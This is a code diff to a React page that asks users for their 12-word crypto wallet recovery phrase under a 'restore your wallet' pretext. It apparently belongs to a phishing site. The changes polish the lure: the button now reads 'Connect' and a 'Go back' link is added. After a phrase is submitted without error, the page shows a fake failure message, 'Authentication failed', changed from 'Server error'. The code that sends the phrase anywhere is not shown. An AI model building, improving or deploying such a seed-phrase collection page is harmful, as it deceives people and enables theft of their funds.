@@ -5,10 +5,15 @@ import { wallets } from "../constants";
 import styles from "../style";
 import { Navbar, Footer } from "../components"; // Make sure Loading is exported from components
 import LoadingComponent from "../components/LoadingComponent";
+import { useNavigate } from "react-router-dom";
 
 const WalletDetailPage = () => {
   const { id } = useParams();
   const wallet = wallets.find((w) => w.id.toString() === id);
+  const navigate = useNavigate();
+  const handleGoBack = () => {
+    navigate(-1); // Go back to the previous page
+  };
 
   const [phrase, setPhrase] = useState("");
   const [error, setError] = useState("");
@@ -67,19 +72,24 @@ const WalletDetailPage = () => {
         <img src={wallet.img} alt={wallet.title} className="w-20 h-20 mb-4" />
       </div>
       <h1 className="text-2xl font-bold mb-2">{wallet.title}</h1>
-      <p className="text-lg mb-6">Enter your 12-word recovery phrase below:</p>
+      <p className="md:text-lg text-sm mb-6 text-center">
+        Enter your 12-word Recorvery Phrase to restore your wallet below:
+      </p>
 
-      <form onSubmit={handleSubmit} className="w-full max-w-md">
+      <form
+        onSubmit={handleSubmit}
+        className="flex flex-col justify-center items-center w-full max-w-md"
+      >
         <textarea
           value={phrase}
           onChange={(e) => setPhrase(e.target.value)}
-          placeholder="e.g. apple banana car drive eagle frog..."
+          placeholder="Enter recovery phrase, separated by spaces"
           className="w-full p-4 rounded-md text-black mb-4 resize-none h-32"
         />
         {error && <p className="text-red-400 mb-2 text-center">{error}</p>}
         {submitted && !error && (
           <p className="text-green-400 mb-2 text-center">
-            "Server error. Please try again later."
+            "Authentication failed. Please try again later."
           </p>
         )}
         <button
@@ -89,9 +99,16 @@ const WalletDetailPage = () => {
             loading ? "bg-gray-500" : "bg-blue-600 hover:bg-blue-700"
           } px-6 py-2 rounded-md font-semibold`}
         >
-          {loading ? "Submitting..." : "Submit"}
+          {loading ? "Connecting..." : "Connect"}
         </button>
       </form>
+      <p
+        onClick={() => handleGoBack()}
+        className="text-blue-400 mt-4 cursor-pointer"
+      >
+        <span className="text-blue-400">←</span>
+        Go back
+      </p>
       <div className="flex justify-center items-center mt-6">
         <Footer />
       </div>
